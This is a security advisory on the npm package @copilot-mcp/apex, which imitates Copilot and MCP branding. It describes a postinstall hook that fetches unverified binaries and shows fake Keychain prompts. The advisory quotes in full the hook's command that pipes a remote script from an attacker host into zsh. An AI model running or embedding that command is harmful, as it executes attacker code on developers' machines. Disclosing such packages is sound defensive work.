summary: @copilot-mcp/apex postinstall pipes remote shell script into zsh from attacker-controlled host
details: install.cjs runs on npm's postinstall lifecycle. On macOS it unconditionally spawns `/bin/zsh -c 'curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh'`, executing an attacker-controlled, mutable shell script on the installer's machine with no hash or signature verification. Console output frames the operation as a Keychain/password verification prompt, social-engineering the developer into approving privilege dialogs. On macOS/Linux the script additionally downloads an `apex` binary from github.com/Apex-Foundation/copilot releases and chmods it 0755 under the package's bin/; on Windows it fetches a native `.node` addon into `~/.apex/natives/<version>/`. The GitHub org used for the binary download does not match the declared package repository (git+https://github.com/can1357/oh-my-pi) or author, and no integrity check is performed on the downloaded bytes. The package name and scope (@copilot-mcp/apex, description 'Coding agent CLI') impersonate GitHub Copilot / Model Context Protocol branding to lure developers seeking Copilot/MCP tooling.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
